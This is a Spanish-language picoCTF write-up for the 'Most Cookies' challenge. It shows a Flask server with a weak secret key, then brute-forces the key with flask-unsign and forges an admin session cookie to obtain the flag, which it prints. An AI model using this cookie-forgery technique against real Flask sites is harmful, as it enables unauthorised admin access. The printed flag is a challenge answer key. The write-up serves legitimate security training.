# Most Cookies

## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)
## Solucion
Vamos a la pagina, y podemos ver que es similar a un reto pasado, pero la cookie no es igual a la anterior, la vemos con ayuda de cookie editor:

```session
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-4VPQ.VxlunfHnSbIuXQervKkSsYiAPFU
```

Investigando un poco, esto se debe a que el sitio esta usando cookies de flask, y estan firmadas con una palabra clave, esto tambien lo podemos ver en el codigo que nos proporciona el mismo reto:
```python 
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()

```
Vemos que hay otra cookie llamada sesion, la cual, para poder obtener la flag, debemos de ser admin, pero si vemos la cookie, vemos que actualmente no lo somos:
```bash
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ echo "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-4VPQ.VxlunfHnSbIuXQervKkSsYiAPFU" | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
```
Vemos que la cookie tiene el valor de la galleta que nosotros ingresamos, entonces lo que vamos a hacer es que vamos a usar una herramienta llamada Flask-Unsign para ver con cual palabra es que se esta firmando la cookie y poder bypassear el filtro:
```bash
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ pipx install flask-unsign       
  installed package flask-unsign 1.2.1, installed using Python 3.13.2
  These apps are now globally available
    - flask-unsign
done! ✨ 🌟 ✨
```
Vamos a usar el siguiente diccionario con las posibles galletas para ver con cual se esta firmando:
```galletas
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

Ahora corremos la herramienta de la siguiente forma:
```sh
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-4VPQ.VxlunfHnSbIuXQervKkSsYiAPFU" --wordlist Cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
```

Vemos cual es la palabra con la que se firma, y lo que hacemos ahora es que vamos a alterar la cookie:
```sh
┌──(xrengariox㉿PC)-[~/Downloads]
└─$ flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-4YQQ.umzAsx0A-SCcH0-8fli7oDh1Fd4
```

Y ahora que tenemos la cookie, nos vamos nuevamente al navegador, y con ayuda de cookie editor, editamos la cookie session y obtenemos la flag:
```flag
picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
```

## Notas adicionales

## Referencias
https://github.com/Paradoxis/Flask-Unsign
https://youtu.be/ufs1xqSQCUM?si=reCW5Rd34c4FfDJB
